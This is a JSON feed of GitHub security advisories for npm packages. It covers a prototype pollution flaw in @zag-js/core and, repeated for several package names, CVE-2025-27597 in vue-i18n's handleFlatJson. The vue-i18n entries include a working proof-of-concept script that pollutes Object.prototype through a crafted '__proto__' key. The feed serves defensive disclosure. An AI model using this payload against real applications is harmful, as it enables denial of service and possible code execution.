{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>A prototype pollution in the lib.deepMerge function of @zag-js/core v0.50.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57079\">https://nvd.nist.gov/vuln/detail/CVE-2024-57079</a></li>\n<li><a href=\"https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b\">https://gist.github.com/tariqhawis/4778fc57084766b7b7fb6d25d20b7b9b</a></li>\n<li><a href=\"https://github.com/chakra-ui/zag/pull/2255\">https://github.com/chakra-ui/zag/pull/2255</a></li>\n<li><a href=\"https://github.com/chakra-ui/zag/commit/f53edc548f737aadfdd486a0043bdd5f5c068bbf\">https://github.com/chakra-ui/zag/commit/f53edc548f737aadfdd486a0043bdd5f5c068bbf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fg4m-w35q-vfg2\">https://github.com/advisories/GHSA-fg4m-w35q-vfg2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fg4m-w35q-vfg2",
            "title": "[@zag-js/core] @zag-js/core prototype pollution",
            "date_modified": "2025-03-10T17:08:36.000Z",
            "date_published": "2025-02-06T06:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fg4m-w35q-vfg2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[petite-vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/core] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/core-base] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
